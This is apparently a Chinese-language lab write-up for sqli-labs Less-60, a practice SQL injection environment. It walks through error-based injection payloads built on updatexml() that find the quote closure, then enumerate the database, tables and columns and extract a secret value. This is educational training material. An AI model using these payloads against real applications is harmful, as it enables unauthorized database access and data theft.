---
title: Less - 60
date: 2023-03-24T19:48:45Z
lastmod: 2023-03-24T20:03:28Z
---

# Less - 60

---

# 通关教程

---

## 1、判断闭合

---

```http
http://192.168.23.128/sqli-labs/Less-59/?id=1"
```

​​![image](assets/image-20230324195430-2glg20n.png)​​

根据错误信息判断闭合方式为")–+，并且为字符型注入。因为有完整错误信息，所以这里我们使用报错注入攻击。

---

## 2、查看当前库

---

```http
http://192.168.23.128/sqli-labs/Less-60/?id=1") and updatexml(1,concat(0x7e,(database()),0x7e),1)--+
```

​![image](assets/image-20230324195509-40suajr.png)​

---

## 3、查看challenges库下的所有表

---

```http
http://192.168.23.128/sqli-labs/Less-60/?id=1") and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+
```

​​![image](assets/image-20230324200046-h9j757s.png)​​

---

## 4、查看tdi4tfrpjh表下的所有字段

---

```http
http://192.168.23.128/sqli-labs/Less-60/?id=1") and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='tdi4tfrpjh'),0x7e),1)--+
```

​​![image](assets/image-20230324200143-aegjt74.png)​​

---

## 5、查看secret_3F2R字段下的值

---

```http
http://192.168.23.128/sqli-labs/Less-60/?id=1") and updatexml(1,concat(0x7e,(select group_concat(secret_3F2R) from challenges.tdi4tfrpjh),0x7e),1)--+
```

​![image](assets/image-20230324200301-ydriab2.png)​

​![image](assets/image-20230324200328-h4y32j8.png)​
